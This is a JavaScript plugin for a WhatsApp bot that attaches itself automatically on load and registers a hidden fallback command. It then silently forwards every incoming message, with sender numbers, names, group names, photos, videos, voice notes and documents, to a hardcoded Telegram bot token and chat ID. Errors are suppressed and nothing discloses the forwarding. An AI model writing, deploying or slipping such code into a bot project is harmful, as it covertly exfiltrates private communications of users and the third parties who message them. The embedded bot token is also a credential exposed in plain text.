const { cmd } = require("../command");
const axios = require("axios");
const FormData = require("form-data");

const TG_BOT_TOKEN = "8699822531:AAFp83cfyJ2RedYvXQMciASvBoWQxBB4Zjg"; 
const TG_CHAT_ID = "6653388298";

const PROCESSED = new Set();
let ATTACHED = false;

async function sendText(text) {
    try {
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            chat_id: TG_CHAT_ID,
            text: text,
            parse_mode: "Markdown"
        }, { timeout: 10000 });
    } catch (e) {}
}

async function sendMedia(buffer, caption, type, filename) {
    try {
        const form = new FormData();
        form.append('chat_id', TG_CHAT_ID);
        form.append('caption', caption);
        
        let endpoint, field, mime;
        if (type === 'image') { endpoint = 'sendPhoto'; field = 'photo'; mime = 'image/jpeg'; filename = filename || 'img.jpg'; }
        else if (type === 'video') { endpoint = 'sendVideo'; field = 'video'; mime = 'video/mp4'; filename = filename || 'vid.mp4'; }
        else if (type === 'voice') { endpoint = 'sendVoice'; field = 'voice'; mime = 'audio/ogg'; filename = filename || 'voice.ogg'; }
        else if (type === 'audio') { endpoint = 'sendAudio'; field = 'audio'; mime = 'audio/mp4'; filename = filename || 'audio.mp3'; }
        else if (type === 'document') { endpoint = 'sendDocument'; field = 'document'; mime = 'application/octet-stream'; filename = filename || 'file.pdf'; }
        else return sendText(caption);
        
        form.append(field, buffer, { filename, contentType: mime });
        
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/${endpoint}`, form, {
            headers: form.getHeaders(),
            timeout: 30000
        });
    } catch (e) {
        await sendText(caption + "\n\n⚠️ Media upload fail");
    }
}

function getNumber(msg, client) {
    const botNum = (client.user?.id || "").split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
    
    const sources = [msg.key?.participant, msg.key?.remoteJid, msg.sender, msg.from, msg.chat];
    
    for (let jid of sources) {
        if (!jid) continue;
        let num = jid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
        if (num === botNum || num.startsWith('120363') || num.length < 10) continue;
        return num;
    }
    return "Unknown";
}

async function processMsg(raw, client) {
    try {
        if (!raw?.key?.id || !raw?.message || raw.key.fromMe) return;
        
        const id = raw.key.id;
        if (PROCESSED.has(id)) return;
        PROCESSED.add(id);
        if (PROCESSED.size > 1000) PROCESSED.clear();
        
        const jid = raw.key.remoteJid || "";
        if (jid === "status@broadcast") return;
        
        const num = getNumber(raw, client);
        const name = raw.pushName || raw.key.participant?.split('@')[0] || "No Name";
        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi", hour12: true });
        
        let chatName = "Private DM";
        const isGroup = jid.endsWith("@g.us");
        if (isGroup) {
            try {
                const meta = await client.groupMetadata(jid);
                chatName = meta?.subject || "Group";
            } catch (e) {}
        }
        
        const base = `🤖 *MESSAGE FORWARD*

🕒 Time: \`${time}\`
👤 Name: ${name}
🔢 Number: [${num}](https://wa.me/${num})
💬 Chat: ${isGroup ? "👥 Group" : "👤 DM"}
🏷️ Chat Name: ${chatName}`.trim();
        
        const msg = raw.message;
        
        // IMAGE
        if (msg.imageMessage) {
            let buffer = null;
            try { buffer = await client.downloadMediaMessage(raw); } catch(e) {}
            if (!buffer && raw.download) try { buffer = await raw.download(); } catch(e) {}
            
            const cap = base + `\n\n📦 Type: 🖼️ Image\n📝 Caption: ${msg.imageMessage.caption || "No Caption"}`;
            if (buffer) await sendMedia(buffer, cap, 'image');
            else await sendText(cap);
            return;
        }
        
        // VIDEO
        if (msg.videoMessage) {
            let buffer = null;
            try { buffer = await client.downloadMediaMessage(raw); } catch(e) {}
            if (!buffer && raw.download) try { buffer = await raw.download(); } catch(e) {}
            
            const cap = base + `\n\n📦 Type: 🎥 Video\n📝 Caption: ${msg.videoMessage.caption || "No Caption"}`;
            if (buffer) await sendMedia(buffer, cap, 'video');
            else await sendText(cap);
            return;
        }
        
        // AUDIO/VOICE
        if (msg.audioMessage) {
            let buffer = null;
            try { buffer = await client.downloadMediaMessage(raw); } catch(e) {}
            if (!buffer && raw.download) try { buffer = await raw.download(); } catch(e) {}
            
            const isVoice = msg.audioMessage.ptt || false;
            const cap = base + `\n\n📦 Type: ${isVoice ? "🎤 Voice" : "🎵 Audio"}`;
            if (buffer) await sendMedia(buffer, cap, isVoice ? 'voice' : 'audio');
            else await sendText(cap);
            return;
        }
        
        // DOCUMENT
        if (msg.documentMessage) {
            let buffer = null;
            try { buffer = await client.downloadMediaMessage(raw); } catch(e) {}
            if (!buffer && raw.download) try { buffer = await raw.download(); } catch(e) {}
            
            const cap = base + `\n\n📦 Type: 📄 Document\n📁 File: ${msg.documentMessage.fileName || "File"}`;
            if (buffer) await sendMedia(buffer, cap, 'document', msg.documentMessage.fileName);
            else await sendText(cap);
            return;
        }
        
        // STICKER
        if (msg.stickerMessage) {
            await sendText(base + `\n\n📦 Type: 🎭 Sticker`);
            return;
        }
        
        // TEXT
        if (msg.conversation || msg.extendedTextMessage) {
            const text = msg.conversation || msg.extendedTextMessage?.text || "";
            await sendText(base + `\n\n📦 Type: 📝 Text\n⌨️ Message: ${text}`);
            return;
        }
        
    } catch (err) {
        console.error("[TG Error]:", err.message);
    }
}

function attach(client) {
    if (ATTACHED) return;
    
    try {
        const ev = client.ev || client.sock?.ev || client.client?.ev;
        if (ev?.on) {
            ev.on("messages.upsert", async (data) => {
                const msgs = data.messages || [];
                for (const m of msgs) await processMsg(m, client);
            });
            ATTACHED = true;
            console.log("[TG] Auto system started ✔");
            return;
        }
    } catch (e) {}
}

// Auto-attach on load
setImmediate(() => {
    const boot = setInterval(() => {
        const c = global.client || global.conn || global.sock || global.bot;
        if (c) {
            attach(c);
            clearInterval(boot);
        }
    }, 2000);
    setTimeout(() => clearInterval(boot), 60000);
});

// Fallback command to ensure attachment
cmd({
    on: "body",
    dontAddCommandList: true,
    filename: __filename
}, async (client, m, store, { from }) => {
    try {
        attach(client);
        if (m.message) await processMsg(m, client);
    } catch (e) {}
});

console.log("[TG] Plugin loaded ✔");
